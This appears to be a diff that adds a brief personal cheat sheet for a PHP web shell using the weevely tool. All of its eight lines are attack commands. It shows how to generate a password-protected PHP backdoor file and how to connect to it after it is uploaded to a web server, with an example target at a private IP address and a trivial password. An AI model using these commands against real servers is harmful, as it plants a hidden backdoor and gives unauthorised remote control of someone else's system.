@@ -1,0 +1,8 @@
+for php reverse shell:
+  payload-----
+    weevely generate <pass> <path>/<filename>
+    weevely generate 123 /home/usr/test.php
+  -------
+  access-------
+    weevely <uploaded path> <password>
+    weevely http://192.168.1.3/uploads/test.php 123
